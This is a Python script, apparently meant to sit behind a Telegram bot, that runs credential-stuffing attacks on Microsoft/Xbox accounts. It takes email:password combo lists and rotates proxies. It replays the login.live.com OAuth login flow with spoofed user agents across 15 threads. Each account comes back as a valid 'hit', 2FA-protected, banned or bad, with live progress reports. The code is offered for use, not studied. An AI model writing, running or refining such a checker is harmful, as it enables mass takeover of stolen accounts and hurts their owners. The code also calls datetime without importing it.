import os
import re
import uuid
import time
import json
import asyncio
import requests
from concurrent.futures import ThreadPoolExecutor

# ─── Proxy Manager (Same Logic) ──────────────────────────────────
class ProxyManager:
    def __init__(self, proxy_file=None, proxy_str=None):
        self.proxies = []
        if proxy_str:
            p = self._parse_line(proxy_str)
            if p: self.proxies.append(p)
        if proxy_file and os.path.isfile(proxy_file):
            with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    p = self._parse_line(line.strip())
                    if p:
                        self.proxies.append(p)
        self.idx = 0

    def _parse_line(self, line):
        if not line or line.startswith('#'):
            return None
        parts = line.split(':')
        if len(parts) == 2:
            return {"http": f"http://{parts[0]}:{parts[1]}", "https": f"http://{parts[0]}:{parts[1]}"}
        elif len(parts) == 4:
            auth = f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            return {"http": f"http://{auth}", "https": f"http://{auth}"}
        return None

    def has_proxies(self):
        return len(self.proxies) > 0

    def get_random_proxy(self):
        if not self.proxies:
            return None
        p = self.proxies[self.idx % len(self.proxies)]
        self.idx += 1
        return p

# ─── Xbox Checker (Core Logic) ───────────────────────────────────
class XboxChecker:
    def __init__(self, proxy_manager=None):
        self.proxy_manager = proxy_manager

    def get_session(self):
        session = requests.Session()
        if self.proxy_manager and self.proxy_manager.has_proxies():
            proxy = self.proxy_manager.get_random_proxy()
            if proxy:
                session.proxies.update(proxy)
        return session

    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "EXPIRED"
            date_str = date_str.replace('Z', '+00:00')
            renewal_date = datetime.fromisoformat(date_str)
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining) if remaining >= 0 else "EXPIRED"
        except Exception:
            return "UNKNOWN"

    def check(self, email, password):
        try:
            session = self.get_session()
            correlation_id = str(uuid.uuid4())
            time.sleep(0.5)

            # Step 1 — HRD check
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
            }
            r1 = session.get(url1, headers=headers1, timeout=10)
            if "MSAccount" not in r1.text:
                return {"status": "BAD"}

            # Step 2 — OAuth authorize
            url2 = ("https://login.live.com/oauth20_authorize.srf?"
                    "client_id=0000000048170EF2"
                    "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                    "&response_type=code"
                    "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
                    "&display=touch&username=" + email)
            r2 = session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, allow_redirects=True, timeout=10)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return {"status": "BAD"}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            # Step 3 — Login POST
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=PassportR&NewUser=1"
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=10)

            if "account or password is incorrect" in r3.text:
                return {"status": "BAD"}
            if "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FA"}
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BANNED"}

            location = r3.headers.get("Location", "")
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}
            
            code = code_match.group(1)

            # Step 4 — Token exchange
            token_data = f"client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&grant_type=authorization_code&code={code}&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
            r4 = session.post("https://login.live.com/oauth20_token.srf", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10)

            if "access_token" not in r4.text:
                return {"status": "BAD"}

            # إذا وصل إلى هنا فالإيميل والشرف صحيحين 100% (Hit صالح)
            return {"status": "PREMIUM", "data": {"info": "Valid Microsoft Account"}}

        except Exception:
            return {"status": "ERROR"}

# ─── Telegram Asynchronous Worker Integration ────────────────────
async def run_telegram_checker(combos_list, update_status_callback):
    """
    دالة تعمل في الخلفية لتشغيل الفحص عبر ThreadPoolExecutor 
    دون تجميد بوت التيليجرام، وتحدث الواجهة أولاً بأول.
    """
    proxy_manager = None # يمكنك إضافة ملف بروسكسيات هنا إن وجد
    checker = XboxChecker(proxy_manager=proxy_manager)
    
    stats = {"total": len(combos_list), "checked": 0, "hits": 0, "bad": 0, "2fa": 0, "errors": 0}
    
    def worker_task(combo):
        email, pwd = combo.split(":", 1)
        res = checker.check(email.strip(), pwd.strip())
        return res.get("status")

    loop = asyncio.get_running_loop()
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = [loop.run_in_executor(executor, worker_task, combo) for combo in combos_list]
        
        for coro in asyncio.as_completed(futures):
            status = await coro
            stats["checked"] += 1
            if status == "PREMIUM":
                stats["hits"] += 1
            elif status == "BAD":
                stats["bad"] += 1
            elif status == "2FA":
                stats["2fa"] += 1
            else:
                stats["errors"] += 1
                
            # تحديث رسالة البوت الحية في تيليجرام كل 5 فحوصات أو حسب الطلب
            if stats["checked"] % 2 == 0 or stats["checked"] == stats["total"]:
                await update_status_callback(stats)
